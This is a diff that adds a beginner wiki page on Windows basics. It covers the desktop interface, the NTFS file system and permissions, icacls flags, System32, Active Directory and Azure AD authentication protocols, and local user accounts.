@@ -1,0 +1,1917 @@
+<!--
+title: Windows basics
+description: 
+published: true
+date: 2022-10-25T09:09:59.597Z
+tags: 
+editor: ckeditor
+dateCreated: 2022-10-25T08:47:31.610Z
+-->
+
+<h1>Fundamental Windows usage</h1>
+<p>The Windows operating system (OS) is a complex product with many system files, utilities, settings, features, etc.&nbsp;</p>
+<p>This module will attempt to provide a general overview of just a handful of what makes up the Windows&nbsp;OS, navigate the user interface, make changes to the system, etc.&nbsp;The content is aimed at those who wish to understand and use the Windows&nbsp;OS&nbsp;on a more comfortable level.&nbsp;</p>
+<p>The Windows operating system has a long history dating back to 1985, and currently,&nbsp;it is the dominant operating system in both home use and corporate networks. Because of this, Windows has always been targeted by hackers &amp; malware writers.</p>
+<p>Windows XP was a popular version of Windows and had a long-running. Microsoft announced Windows Vista, which was a complete overhaul of the Windows operating system. There were many issues with Windows Vista. It wasn't received well by Windows users, and it was quickly phased out.</p>
+<p>When Microsoft announced the end-of-life date for Windows XP, many customers panicked. Corporations, hospitals, etc., scrambled and tested the next viable Windows&nbsp;version, which was Windows 7, against many other hardware and devices. Vendors had to work against the clock to ensure their products worked with Windows 7 for their customers. If they couldn't, their customers had to break their agreement and find another vendor that upgraded their products to work with Windows 7. It was a nightmare for many, and Microsoft took note of it.</p>
+<p>Windows 7, as quickly as it was released soon after, was marked with an end of support date.&nbsp;Windows 8.x came and left and it was short-lived, like Vista.</p>
+<p>Then arrived&nbsp;<a href="https://www.microsoft.com/en-us/windows/features?activetab=NewPopular">Windows 10</a>, which is the current Windows operating system version for desktop computers.</p>
+<p>Windows 10 comes in 2 flavors, Home and Pro. You can read the difference between the Home and Pro&nbsp;<a href="https://www.microsoft.com/en-us/windows/compare-windows-10-home-vs-pro">here</a>.&nbsp;</p>
+<p>Even though we didn't talk about servers, the current version of the Windows operating system for servers is&nbsp;<a href="https://www.microsoft.com/en-us/windows-server">Windows Server 2019</a>.</p>
+<p>Many critics like to bash on Microsoft, but they have made long strides to improve the usability and security with each new version of Windows.</p>
+<p><strong>Note</strong>: The Windows edition for the attached&nbsp;VM&nbsp;is Windows Server 2019 Standard, as seen in&nbsp;<strong>System Information</strong>.</p>
+<p><strong>Update</strong>: As of June 2021, Microsoft announced the retirement dates for Windows 10&nbsp;<a href="https://docs.microsoft.com/en-us/lifecycle/products/windows-10-home-and-pro?ranMID=24542&amp;ranEAID=kXQk6*ivFEQ&amp;ranSiteID=kXQk6.ivFEQ-M28j3qbUhtM2JFCT2wmhOA&amp;epi=kXQk6.ivFEQ-M28j3qbUhtM2JFCT2wmhOA&amp;irgwc=1&amp;OCID=AID2000142_aff_7593_1243925&amp;tduid=%28ir__uszrgcddyskfqz3fkk0sohz3wv2xuurc01kgzkod00%29%287593%29%281243925%29%28kXQk6.ivFEQ-M28j3qbUhtM2JFCT2wmhOA%29%28%29&amp;irclickid=_uszrgcddyskfqz3fkk0sohz3wv2xuurc01kgzkod00&amp;ranMID=24542&amp;ranEAID=kXQk6*ivFEQ&amp;ranSiteID=kXQk6.ivFEQ-4cKUPfbv9lM_IR2EX7K_hw&amp;epi=kXQk6.ivFEQ-4cKUPfbv9lM_IR2EX7K_hw&amp;irgwc=1&amp;OCID=AID2000142_aff_7593_1243925&amp;tduid=%28ir__feexvhocigkfqna9kk0sohznb32xutanagupypus00%29%287593%29%281243925%29%28kXQk6.ivFEQ-4cKUPfbv9lM_IR2EX7K_hw%29%28%29&amp;irclickid=_feexvhocigkfqna9kk0sohznb32xutanagupypus00">here</a>.&nbsp;</p>
+<p>"<i>Microsoft will continue to support at least one Windows 10 Semi-Annual Channel until October 14, 2025</i>".</p>
+<p>As of October 5th, 2021 - Windows 11 now is the current Windows operating system for end-users. Read more about Windows 11&nbsp;<a href="https://www.microsoft.com/en-us/windows?wa=wsignin1.0">here</a>.&nbsp;&nbsp;</p>
+<p>&nbsp;</p>
+<h2>The Desktop gui</h2>
+<p>The Windows Desktop, aka the graphical user interface or GUI in short, is the screen that welcomes you once you log into a Windows 10 machine.</p>
+<p>Traditionally, you need to pass the login screen first. The login screen is where you need to enter valid account credentials; usually, a username &amp; password of a preexisting Windows account on that particular system or in the Active Directory environment (if it's a domain-joined machine).&nbsp;</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image002.png" alt="Afbeelding met tekst, licht, lucht, verkeer
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>The above screenshot is an example of a typical Windows Desktop. Each component that makes up the GUI is explained briefly below.</p>
+<p>The Desktop</p>
+<p>Start Menu</p>
+<p>Search Box (Cortana)</p>
+<p>Task View</p>
+<p>Taskbar</p>
+<p>Toolbars</p>
+<p>Notification Area</p>
+<p><strong>The Desktop</strong></p>
+<p>The desktop is where you will have shortcuts to programs, folders, files, etc. These icons will either be well organized in folders sorted alphabetically or scattered randomly with no specific organization on the desktop. In either case, these items are typically placed on the desktop for quick access.</p>
+<p>The look and feel of the desktop can be changed to suit your liking.&nbsp;By right-clicking anywhere on the desktop, a context menu will appear. This menu will allow you to change the sizes of the desktop icons, specify how you want to arrange them, copy/paste items to the desktop, and create new items, such as a folder, shortcut, or text document.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image004.png"></figure>
+<p>Under&nbsp;<strong>Display settings</strong>, you can make changes to the screen's resolution and orientation. In case you have multiple computer screens, you can make configurations to the multi-screen setup here.&nbsp;</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image006.png"></figure>
+<p><strong>Note</strong>: In a Remote Desktop session, some of the display settings will be disabled.&nbsp;</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image008.png" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>You can also change the wallpaper by selecting&nbsp;<strong>Personalize</strong>.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image009.png"></figure>
+<p>Under Personalize, you can change the background image to the Desktop, change fonts, themes, color scheme, etc.&nbsp;</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image011.png"></figure>
+<p><strong>The Start Menu</strong></p>
+<p>In previous versions of Windows, the word&nbsp;<strong>Start</strong>&nbsp;was visible at the bottom left corner of the desktop GUI. In modern versions of Windows, such as Windows 10, the word 'Start' doesn't appear anymore, but rather a Windows Logo is shown instead. Even though the look of the Start Menu has changed, its overall purpose is the same.&nbsp;</p>
+<p>The Start Menu provides access to all the apps/programs, files, utility tools, etc., that are most useful.&nbsp;</p>
+<p>Clicking on the Windows logo, the Start Menu will open. The Start Menu is broken up into sections.&nbsp;See below.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image013.png"></figure>
+<p><br><br>&nbsp;</p>
+<p>1. This section of the Start Menu provides quick shortcuts to actions that you can perform with your account or login session, such as making changes to your user account, lock your screen, or signing out of your account. Other shortcuts specific to your account are your Documents (document icon) folder and Pictures folder (pictures icon). Lastly, the gear/cog icon will take you to the Settings screen, and the power icon will allow you to Disconnect from a&nbsp;<a href="https://community.windows.com/en-us/stories/work-from-anywhere-with-windows-10-remote-desktop">Remote Desktop</a>&nbsp;session, shut down the computer, or restart the computer.</p>
+<p>In the below image, you can see what each of the icons represents. To expand this section, click on the icon that resembles a hamburger at the top.&nbsp;&nbsp;</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image015.png"></figure>
+<p>2. This section will show all&nbsp;<strong>Recently added</strong>&nbsp;apps/programs at the top&nbsp;<u>and</u>&nbsp;all the installed apps/programs (that are configured to appear in the Start Menu). In this section, you'll also see the apps/programs will be listed in alphabetical order.&nbsp;Each letter will have its own section. See below.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image017.png"></figure>
+<p>In the above image, the first box is where the recently added apps/programs will appear. The second box is where all the installed apps/programs will appear.&nbsp;</p>
+<p><strong>Note</strong>: In your&nbsp;VM, Google Chrome will not show up as a Recently Added program anymore.</p>
+<p>If you have a LONG list of installed apps/programs, you can jump to a particular section in the list by clicking on the letter headings to launch an alphabet grid.&nbsp;See below.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image019.png" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p><strong>Note</strong>: The white letters match the letter headings.&nbsp;</p>
+<p>3. The right side of the Start Menu is where you will find icons for specific apps/programs or utilities. These icons are known as&nbsp;<strong>tiles</strong>. Some tiles are added to this section by default. If you right-click any of the tiles, you guessed it; a menu will appear to allow you to perform more actions on the selected tile; such as resizing the tile, unpinning from Start Menu, view its Properties, etc.&nbsp;See below.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image021.png"></figure>
+<p>Apps/programs can be added to this Start Menu section by right-clicking the app/program and selecting Pin to Start.&nbsp;See below.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image023.png"></figure>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image025.png"></figure>
+<p><strong>The Taskbar</strong></p>
+<p>Some of the components are enabled and visible by default. The Toolbar (6), for example, was enabled for demonstration purposes.&nbsp;&nbsp;</p>
+<p>If you're like me and want to disable some of these components, you can right-click on Taskbar to bring up a context menu that will allow you to make changes.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image027.png"></figure>
+<p>Any apps/programs, folders, files, etc., that you open/start will appear in the taskbar.&nbsp;</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image029.png" alt="Afbeelding met tekst, schermafbeelding, elektronica, scherm
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>Hovering over the icon will provide a preview thumbnail, along with a tooltip. This&nbsp; tooltip is handy if you have many apps/programs open, such as Google Chrome, and you wish to find which instance of Google Chrome is the one you need to bring in to focus.&nbsp;</p>
+<p>When you close any of these items, they will disappear from the taskbar (unless you explicitly pinned it to the taskbar).&nbsp;</p>
+<p><strong>The Notification Area</strong></p>
+<p>The Notification Area, which is typically located at the bottom right of the Windows screen, is where the date and time are displayed. Other icons possibly visible in this area is the volume icon, network/wireless icon, to name a few. Icons can be either added or removed from the Notification Area in Taskbar settings.&nbsp;</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image031.png"></figure>
+<p>From there, scroll down to the Notification Area section to make changes.&nbsp;</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image033.png" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>Here are Microsoft's brief documentations for the&nbsp;<a href="https://support.microsoft.com/en-us/windows/see-what-s-on-the-start-menu-a8ccb400-ad49-962b-d2b1-93f453785a13">Start Menu</a>&nbsp;and&nbsp; <a href="https://support.microsoft.com/en-us/windows/customize-the-taskbar-notification-area-e159e8d2-9ac5-b2bd-61c5-bb63c1d437c3">Notification Area</a>.</p>
+<p><strong>Tip</strong>: You can right-click any folder, file, app/program, or icon to&nbsp;view more information or perform other actions on the clicked item.&nbsp;</p>
+<p>&nbsp;</p>
+<h2>Windows filesystem</h2>
+<p>The file system used in modern versions of&nbsp;Windows&nbsp;is the&nbsp;<strong>New Technology File System</strong>&nbsp;or simply&nbsp;<a href="https://docs.microsoft.com/en-us/windows-server/storage/file-server/ntfs-overview">NTFS</a>.</p>
+<p>Before NTFS, there was&nbsp;<strong>FAT16/FAT32&nbsp;</strong>(File Allocation Table) and&nbsp;<strong>HPFS&nbsp;</strong>(High Performance File System).&nbsp;</p>
+<p>You still see FAT partitions in use today. For example, you typically see FAT partitions in USB devices, MicroSD cards, etc.&nbsp;but traditionally not on personal Windows computers/laptops or Windows servers.</p>
+<p>NTFS is known as a journaling file system. In case of a failure, the file system can automatically repair the folders/files on disk using information stored in a log file. This function is not possible with FAT.&nbsp; &nbsp;</p>
+<p>NTFS addresses many of the limitations of the previous&nbsp;file systems; such as:&nbsp;</p>
+<p>Supports files larger than 4GB</p>
+<p>Set specific permissions on folders and files</p>
+<p>Folder and file compression</p>
+<p>Encryption (<a href="https://docs.microsoft.com/en-us/windows/win32/fileio/file-encryption">Encryption File System</a>&nbsp;or&nbsp;<strong>EFS</strong>)</p>
+<p>If you're running Windows, what is the file system your Windows installation is using? You can check the Properties (right-click) of the drive your operating system is installed on, typically the C drive (C:\).</p>
+<p>&nbsp;</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image034.gif" alt="Afbeelding met monitor, binnen, scherm, plat
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>You can read Microsoft's official documentation on FAT, HPFS, and NTFS&nbsp;<a href="https://docs.microsoft.com/en-us/troubleshoot/windows-client/backup-and-storage/fat-hpfs-and-ntfs-file-systems">here</a>.&nbsp;</p>
+<p>Let's speak briefly on some features that are specific to NTFS.&nbsp;</p>
+<p>On NTFS volumes, you can set permissions that grant or deny access to files and folders.</p>
+<p>The permissions are:</p>
+<p><strong>Full control</strong></p>
+<p><strong>Modify</strong></p>
+<p><strong>Read &amp; Execute</strong></p>
+<p><strong>List folder contents</strong></p>
+<p><strong>Read</strong></p>
+<p><strong>Write</strong></p>
+<p>The below image lists the meaning of each permission on how it applies to a file and a folder.&nbsp;(credit&nbsp;<a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/bb727008(v=technet.10)?redirectedfrom=MSDN">Microsoft</a>)</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image036.png" alt="Afbeelding met tekst, monitor, schermafbeelding, scherm
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>How can you view the permissions for a file or folder?</p>
+<p>Right-click the file or folder you want to check for permissions.</p>
+<p>From the context menu, select&nbsp;<code>Properties</code>.</p>
+<p>Within Properties, click on the&nbsp;<code>Security</code>&nbsp;tab.</p>
+<p>In the&nbsp;<code>Group or user names</code>&nbsp;list, select the user, computer, or group whose permissions you want to view.</p>
+<p>In the below image, you can see the permissions for the&nbsp;<code>Users</code>&nbsp;group for the Windows folder.&nbsp;</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image038.png"></figure>
+<p>Refer to the Microsoft documentation to get a better understanding of the NTFS permissions for&nbsp;<strong>Special Permissions</strong>.</p>
+<p>Another feature of NTFS is&nbsp;<strong>Alternate Data Streams</strong>&nbsp;(<strong>ADS</strong>).</p>
+<p><strong>Alternate Data Streams</strong>&nbsp;(ADS) is a file attribute specific to Windows&nbsp;<strong>NTFS</strong>&nbsp;(New Technology File System).</p>
+<p>Every file has at least one data stream (<code>$DATA</code>), and ADS allows files to contain more than one stream of data. Natively&nbsp;<a href="https://support.microsoft.com/en-us/windows/what-s-changed-in-file-explorer-ef370130-1cca-9dc5-e0df-2f7416fe1cb1">Window Explorer</a>&nbsp;doesn't display ADS to the user. There are 3rd party executables that can be used to view this data, but&nbsp;<a href="https://docs.microsoft.com/en-us/powershell/scripting/overview?view=powershell-7.1">Powershell</a>&nbsp;gives you the ability to view ADS for files.</p>
+<p>From a security perspective, malware writers have used ADS to hide data.</p>
+<p>Not all its uses are malicious. For example, when you download a file from the Internet, there are identifiers written to ADS to identify that the file was downloaded from the Internet.</p>
+<p>To learn more about ADS, refer to the following link from MalwareBytes&nbsp;<a href="https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/">here</a>.&nbsp;</p>
+<p>&nbsp;</p>
+<h3>Privileges explained</h3>
+<p>The file system is the method and data structure that an operating system uses to keep track of files on a disk or partition. Without a file system, the information saved in a storage media would be one large body of data with no way to tell where the information begins and ends.</p>
+<p>&nbsp;</p>
+<p>Windows file system structure is:</p>
+<p>Logical drives (Ex: Local Disk C)</p>
+<p>Folders (these are the folders that come by default. Ex: Documents, Downloads, Music)</p>
+<p>Files</p>
+<p>&nbsp;</p>
+<p>Something that might also interest you would be the folders located on the C drive and their role. These folders are:</p>
+<ul>
+  <li>PerfLogs</li>
+  <li>Program Files</li>
+  <li>Program Files (x86)</li>
+  <li>Users</li>
+  <li>Windows</li>
+</ul>
+<p>Let me break them down and explain each of them:</p>
+<ul>
+  <li>PerfLogs - Stores the system issues and other reports regarding performance</li>
+  <li>Program Files and Program Files (x86) - Is the location where programs install unless you change their path (Ex: Choosing to install software on D drive)</li>
+  <li>Users - In this folder are stored the users created. It also stores users generated data (Ex: Saving a file on your Desktop)</li>
+  <li>Windows - It's the folder which basically contains the code to run the operating system and some utility tools (we'll talk about them later)</li>
+</ul>
+<p><br><br>&nbsp;</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image040.png"></figure>
+<p><br><br>&nbsp;</p>
+<p><strong>﻿File permissions﻿</strong><br><br>&nbsp;</p>
+<p>﻿FIles permissions can be set by an administrator or a privileged account. These permissions can be applied to:</p>
+<ul>
+  <li>Users</li>
+  <li>Groups</li>
+</ul>
+<p>Permissions that can be set are:</p>
+<ul>
+  <li>Full control</li>
+  <li>Modify</li>
+  <li>Read &amp; execute</li>
+  <li>List folders content</li>
+  <li>Read</li>
+  <li>Write</li>
+  <li>Special permissions</li>
+</ul>
+<p>&nbsp;</p>
+<p>Full control - allows the user/users/group/groups to set the ownership of the folder, set permission for others, modify, read, write, and execute files.<br>Modify - allows&nbsp;the user/users/group/groups to modify, read, write, and execute files.<br>Read &amp; execute - allows&nbsp;the user/users/group/groups to read and execute files.</p>
+<p>List folder contents - allows&nbsp;the user/users/group/groups to list the contents (files, subfolders, etc) of a folder.<br>Read - only allows&nbsp;the user/users/group/groups to read files.<br>Write - allows&nbsp;the user/users/group/groups to write data to the specified folder (automatically set when "Modify" right is checked).<br><br>&nbsp;</p>
+<p>To set permissions for a file or folder right click on the file and select "Properties". Go to the "Security" tab and click on the "Edit" button.</p>
+<p><br>&nbsp;</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image042.png"></figure>
+<p><br><br>&nbsp;</p>
+<p>As you can see Users can only read, execute, and list the folder contents. However, we want to allow them to be able to store, edit, or delete files inside that folder. To do that, check the "Modify" box (you will see that by checking the Modify box the Write box will be automatically checked too).</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image044.png" alt="Afbeelding met tafel
+
+Automatisch gegenereerde beschrijving"></figure>
+<p><br><br>&nbsp;</p>
+<p>To apply the changes click on the "Apply" button.</p>
+<p>The reason we do not set the full control permission on the folder is that users could set permissions and take ownership of the folder themselves (without the action of an administrator/privileged user).</p>
+<p>A tool you can use to check the files or folder permissions is "<strong>icacls</strong>".</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image045.png" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>Let's explain what those letters in parentheses mean as right now you might be confused.</p>
+<p>I - permission inherited from the parent container</p>
+<p>F - full access (full control)</p>
+<p>M - Modify right/access</p>
+<p>OI - object inherit</p>
+<p>IO - inherit only</p>
+<p>CI - container inherit</p>
+<p>RX - read and execute</p>
+<p>AD - append data (add subdirectories)</p>
+<p>WD - write data and add files</p>
+<p>You can use icacls to check permissions, set ownership of the folder, set, remove or deny permissions. An example would be setting the ownership of the folder to Users.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image046.png"></figure>
+<p>To check if that applied you can right-click on the folder and select "Properties", go to the "Security" tab, and click on "Advanced". There you should be able to see that the owner is "Users".</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image048.png" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<h2>Windows, system32</h2>
+<p>The Windows folder (<code>C:\Windows</code>) is traditionally known as the folder which contains the Windows operating system.&nbsp;</p>
+<p>The folder doesn't have to reside in the C drive necessarily. It can reside in any other drive and technically can reside in a different folder.</p>
+<p>This is where environment variables, more specifically system environment variables, come into play.&nbsp;Even though not discussed yet, the system&nbsp; environment variable for the Windows directory is&nbsp;<code>%windir%</code>.</p>
+<p>Per&nbsp;<a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_environment_variables?view=powershell-7.1">Microsoft</a>, "<i>Environment variables store information about the operating system environment. This information includes details such as the operating system path, the number of processors used by the operating system, and the location of temporary folders</i>".</p>
+<p>There are many folders within the 'Windows' folder.&nbsp;See below.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image050.png" alt="Afbeelding met tafel
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>One of the many folders is&nbsp;<strong>System32</strong>.&nbsp;</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image052.png" alt="Afbeelding met tafel
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>The System32 folder holds the important files that are critical for the operating system.</p>
+<p>You should proceed with extreme caution when interacting with this folder. Accidentally deleting any files or folders within System32 can render the Windows&nbsp;OS&nbsp;inoperational. Read more about this action&nbsp;<a href="https://www.howtogeek.com/346997/what-is-the-system32-directory-and-why-you-shouldnt-delete-it/">here</a>.&nbsp;</p>
+<p><strong>Note</strong>: Many of the tools that will be covered in the Windows Fundamentals series reside within the System32 folder.&nbsp;</p>
+<p>&nbsp;</p>
+<h2>The Windows authentication process</h2>
+<p>There are several authentication mechanisms, dividable in local and remote.</p>
+<p>&nbsp;</p>
+<h3>Local authentication</h3>
+<p>﻿Local authentication is done using the Local Security Authority (LSA). LSA is a protected subsystem that&nbsp;keeps track of the security policies and the accounts that are on a computer system. It also&nbsp;maintains information about all aspects of local security on a computer.</p>
+<h3><br>Remote authentication</h3>
+<p>There are two types of Active Directory:</p>
+<ul>
+  <li>On-Premise Active Directory (AD)</li>
+  <li>Azure Active Directory&nbsp;﻿(AAD)<br><br>&nbsp;</li>
+</ul>
+<h3>Authentication on On-Premise Active Directory</h3>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image054.png"></figure>
+<p><br><br>&nbsp;</p>
+<p>On-premise Active Directory has a record of all users, PCs and Servers&nbsp;and&nbsp;authenticates&nbsp;the&nbsp;users signing in&nbsp;(the network logon).&nbsp;Once signed in, Active Directory also governs what the users&nbsp;are, and are not, allowed to do or access (authorization).</p>
+<p>In an on-premise Active Directory environment the authentication can be made by using the following protocols:</p>
+<ul>
+  <li>NTLM</li>
+  <li>LDAP / LDAPS</li>
+  <li>KERBEROS</li>
+</ul>
+<p><br><br>&nbsp;</p>
+<h4>NTLM / NTLM 2<br><br>&nbsp;</h4>
+<p>_______________</p>
+<p>NTLM uses a challenge-response sequence of messages between a client and a server system. NTLM&nbsp;&nbsp;provides authentication based on a challenge-response authentication scheme. It does not provide data integrity or data confidentiality protection for the authenticated network connection.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image056.png" alt="Afbeelding met tekst, binnen, keukenapparaat, betegeld
+
+Automatisch gegenereerde beschrijving"></figure>
+<p><br><br>&nbsp;</p>
+<h4>LDAP / LDAPS</h4>
+<p>_______________</p>
+<p>The main difference between LDAP and LDAPS is that LDAPS support encryption and therefore the credentials are not sent in plain text across the network.</p>
+<p>Another thing to keep in mind is that the Domain Controller (DC) can be considered a database of users, groups, computers and so on (contains information about objects). Using LDAP/LDAPS the user's workstation sends the credentials using an API to the Domain Controller in order to validate them and be able to log in.</p>
+<p>The procedure is similar to the image below:</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image058.png"></figure>
+<p>&nbsp;</p>
+<h4>KERBEROS</h4>
+<p>_______________</p>
+<p>Another way to authenticate is using Kerberos. Kerberos uses&nbsp;<a href="https://en.wikipedia.org/wiki/Symmetric-key_algorithm">symmetric-key cryptography</a>&nbsp;and requires trusted third-party authorization to verify user identities.&nbsp;The authentication process is similar to the one below:</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image060.png"></figure>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<h3>﻿Authentication on Azure Active Directory</h3>
+<p>﻿</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image062.png"></figure>
+<p><br><br>&nbsp;</p>
+<p><strong>Azure Active Directory</strong>&nbsp;is a secure online authentication store, which can contain users and groups. Users have a username and a password which are used when you sign in to an application that uses Azure Active Directory for authentication. So, for example, all of the Microsoft Cloud services use Azure Active Directory for authentication: Office 365, Dynamics 365 and Azure.</p>
+<p>Azure Active Directory supports the following authentication methods:</p>
+<p>SAML (Security Assertion Markup Language)</p>
+<p>OAUTH 2.0</p>
+<p>OpenID Connect</p>
+<p><br><br>&nbsp;</p>
+<h4>SAML (Security Assertion Markup Language)</h4>
+<p>_______________</p>
+<p>Security Assertion Markup Language (SAML) is a type of Single Sign-On (SSO) standard. It defines a set of rules/protocols that allow users to access web applications with a single login. This is possible because those applications (referred to as “Service Providers”) all trust the systems that verify users’ identities (referred to as “Identity Providers”).</p>
+<p>Service Providers - These are the systems and applications that users access throughout the day.</p>
+<p>Identity Providers - This would be the system that performs user authentication.</p>
+<p>&nbsp;</p>
+<h4>OAUTH 2.0<br><br>&nbsp;</h4>
+<p>_______________</p>
+<p>OAuth 2.0 is a standard that apps use to provide client applications with access.</p>
+<p>OAuth 2.0 spec has four important roles:</p>
+<p>The authorization server, which is the server that issues the access token.</p>
+<p>The resource owner, normally your application's end-user, that grants permission to access the resource server with an access token.</p>
+<p>The client, which is the application that requests the access token, and then passes it to the resource server.</p>
+<p>The resource server, which accepts the access token and must verify that it is valid. In this case, this is your application.</p>
+<p>&nbsp;</p>
+<h4>OpenID Connect<br><br>&nbsp;</h4>
+<p>_______________</p>
+<p>OpenID Connect is an authentication standard built on top of OAuth 2.0. It adds an additional token called an ID token.</p>
+<p>For that, it uses simple JSON Web Tokens (JWT). While OAuth 2.0 is about resource access and sharing, OIDC is all about user authentication</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<h2>User Accounts, Profiles, and Permissions</h2>
+<p>&nbsp;</p>
+<p>User&nbsp;accounts can be one of two types on a typical local Windows system:&nbsp;<strong>Administrator&nbsp;</strong>&amp;&nbsp;<strong>Standard User</strong>.&nbsp;</p>
+<p>The user account type will determine what actions the user can perform on that specific Windows system.&nbsp;</p>
+<p>An Administrator can make changes to the system: add users, delete users, modify groups, modify settings on the system, etc.&nbsp;</p>
+<p>A Standard User can only make changes to folders/files attributed to the user &amp; can't perform system-level changes, such as install programs.</p>
+<p>You are currently logged in as an Administrator. There are several ways to determine which user accounts exist on the system.&nbsp;</p>
+<p>One way is to click the&nbsp;Start Menu&nbsp;and type&nbsp;Other User. A shortcut to&nbsp;System Settings &gt; Other users&nbsp;should appear.&nbsp;</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image063.png" alt="Afbeelding met tekst, schermafbeelding, watervogel, plant
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>If you click on it, a Settings window should now appear.&nbsp;See below.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image065.png"></figure>
+<p>Since you're the Administrator, you see an option to&nbsp;<strong>Add someone else to this PC</strong>.</p>
+<p><strong>Note</strong>: A Standard User will not see this option.&nbsp;&nbsp;</p>
+<p>Click on the local user account. More options should appear:&nbsp;<strong>Change account type</strong>&nbsp;and&nbsp;<strong>Remove</strong>.&nbsp;</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image067.png" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>Click on Change account type. The value in the drop-down box (or the highlighted value if you click the drop-down) is the current account type.&nbsp;</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image069.png"></figure>
+<p>When a user account is created, a profile is created for the user. The location for each user profile folder will fall under is C:\Users.</p>
+<p>For example, the user profile folder for the user account Max will be C:\Users\Max.</p>
+<p>The creation of the user's profile is done upon initial login. When a new user account logs in to a local system for the first time, they'll see several messages on the login screen. One of the messages, User Profile Service, sits on the login screen for a while, which is at work creating the user profile.&nbsp;See below.</p>
+<p>&nbsp;</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image071.png"></figure>
+<p>Once logged in, the user will see a dialog box similar to the one below (again), indicating that the profile is in creation.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image072.png" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
